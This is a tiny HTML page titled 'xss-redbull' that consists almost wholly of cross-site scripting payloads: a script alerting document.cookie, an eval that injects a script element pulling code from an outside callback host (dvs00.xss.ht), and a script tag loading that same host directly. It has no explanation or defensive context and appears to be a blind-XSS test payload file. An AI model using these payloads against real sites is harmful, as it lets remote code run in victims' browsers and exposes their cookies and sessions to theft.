<html>
<head>
<title>xss-redbull</title>
</head>
<body>
  <script>alert(document.cookie)</script>
  <script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'https://dvs00.xss.ht\';document.body.appendChild(a)')
  </script>
<script src=https://dvs00.xss.ht></script>
  <p>Done</p>
</body>
</html>
